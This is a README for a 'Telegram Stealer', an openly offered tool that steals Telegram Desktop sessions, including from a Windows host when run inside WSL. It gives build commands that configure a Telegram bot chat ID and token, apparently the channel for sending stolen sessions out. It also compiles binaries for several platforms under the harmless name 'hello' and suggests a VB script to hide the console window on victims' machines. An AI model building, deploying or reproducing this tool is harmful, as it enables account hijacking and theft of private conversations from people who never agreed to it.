# Telegram Stealer

Steal Telegram Desktop sessions.

If the stealer is started inside WSL, it will get the Telegram Desktop sessions from its Windows host.

**Note:** If the target configured a local password in Telegram Desktop, the sessions will be encrypted, so you would need the password to unlock it.

## Demo

https://youtu.be/3mKOwtCnwYw

## Build

Install dependencies

```sh
npm i
npm i -g pkg
```

Build

```sh
npm run configure <chat_id> <bot_token> # Or just set it in `runner.js`

# Create the stealer binary, choose target system and architecture
npm run pkg-windows
npm run pkg-linux
npm run pkg-linux-arm
npm run pkg-macos
npm run pkg-macos-arm
```

## Run

Run the `hello` binary.

To hide the console window on a Windows machine, you can run the script using the provided VB script (see [`run_hidden_windows.vbs`](./run_hidden_windows.vbs)).

## License

[The MIT license](./LICENSE)
